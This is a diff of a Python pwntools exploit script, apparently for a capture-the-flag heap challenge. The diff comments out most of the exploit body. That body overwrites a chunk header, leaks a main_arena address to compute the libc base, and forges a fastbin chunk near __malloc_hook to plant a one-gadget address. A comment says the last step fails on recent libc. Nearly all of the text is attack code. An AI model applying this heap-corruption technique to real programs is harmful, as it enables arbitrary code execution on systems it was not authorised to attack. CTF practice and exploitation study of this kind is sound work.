@@ -89,65 +89,65 @@ fill(0, b'\x42'*0x30+p.p64(0x0)+p.p64(0x181))  # overwrite header of id 1 so we 
 
 free(3)
 
-allocate(0xf0)
+# allocate(0xf0)
 
-fill(2, b'5'*0x50)
+# fill(2, b'5'*0x50)
 
-# the leak will correspond to <main_arena+96>
-main_arena_leak = dump(1)
-main_arena_leak = p.u64(main_arena_leak[:8])
-print('leak:', hex(main_arena_leak))
-libc_base = main_arena_leak - elf.symbols['__malloc_hook'] - 0x70
-print('libc_base:', hex(libc_base))
-gadget = libc_base + 0xe6c7e
-print('gadget:', hex(gadget))
-malloc_hook = libc_base + elf.symbols['__malloc_hook']
-fake_chunk = malloc_hook - 0x10  # take headers in account
-print('fake_chunk:', hex(fake_chunk))
+# # the leak will correspond to <main_arena+96>
+# main_arena_leak = dump(1)
+# main_arena_leak = p.u64(main_arena_leak[:8])
+# print('leak:', hex(main_arena_leak))
+# libc_base = main_arena_leak - elf.symbols['__malloc_hook'] - 0x70
+# print('libc_base:', hex(libc_base))
+# gadget = libc_base + 0xe6c7e
+# print('gadget:', hex(gadget))
+# malloc_hook = libc_base + elf.symbols['__malloc_hook']
+# fake_chunk = malloc_hook - 0x10  # take headers in account
+# print('fake_chunk:', hex(fake_chunk))
 
 
-# At this point we have
-# 0x30: id 0. contains \x42, used to overwrite next chunk's headers
-# 0xf0: id 2. (will soon be removed for rearrangement)
-# 0x78: id 1. contains 4, is considered as freed
-# 0xf0:
-# 0x30: id 4
+# # At this point we have
+# # 0x30: id 0. contains \x42, used to overwrite next chunk's headers
+# # 0xf0: id 2. (will soon be removed for rearrangement)
+# # 0x78: id 1. contains 4, is considered as freed
+# # 0xf0:
+# # 0x30: id 4
 
-# As per the tutorial, we will reorganize the memory
-# 0x30: id 0
-# 0x10: id 2
-# 0x60: id 3
-# 0x60: id 5
-# 0x78: id 1 & 6
-# 0xf0:
-# 0x30: id 4
+# # As per the tutorial, we will reorganize the memory
+# # 0x30: id 0
+# # 0x10: id 2
+# # 0x60: id 3
+# # 0x60: id 5
+# # 0x78: id 1 & 6
+# # 0xf0:
+# # 0x30: id 4
 
-free(2)  # free to make place for heap rearrangement
+# free(2)  # free to make place for heap rearrangement
 
-allocate(0x10)  # id 2
-allocate(0x60)  # id 3
-allocate(0x60)  # id 5
-allocate(0x60)  # id 6
+# allocate(0x10)  # id 2
+# allocate(0x60)  # id 3
+# allocate(0x60)  # id 5
+# allocate(0x60)  # id 6
 
-# we should have same output for id 1 & 6
-fill(6, b'Hello there')
-print('Index 1:', dump(1))
-print('Index 6:', dump(6))
+# # we should have same output for id 1 & 6
+# fill(6, b'Hello there')
+# print('Index 1:', dump(1))
+# print('Index 6:', dump(6))
 
-free(6)
-free(5)
-free(1)
+# free(6)
+# free(5)
+# free(1)
 
-allocate(0x60)  # id 1
-allocate(0x60)  # id 5
-fill(1, p.p64(fake_chunk) + p.p64(0) + b'y'*0x50)
-allocate(0x60)  # id 6
+# allocate(0x60)  # id 1
+# allocate(0x60)  # id 5
+# fill(1, p.p64(fake_chunk) + p.p64(0) + b'y'*0x50)
+# allocate(0x60)  # id 6
 
-# should have worked at this point but for the index check on recent libc
-# allocate(0x60)  # id 7, used to overwrite malloc_hook
-# fill(7, b'z'*0x13 + p.p64(gadget))
+# # should have worked at this point but for the index check on recent libc
+# # allocate(0x60)  # id 7, used to overwrite malloc_hook
+# # fill(7, b'z'*0x13 + p.p64(gadget))
 
-# target.sendline(b'1')
-# target.sendline(b'2')
+# # target.sendline(b'1')
+# # target.sendline(b'2')
 
 target.interactive()
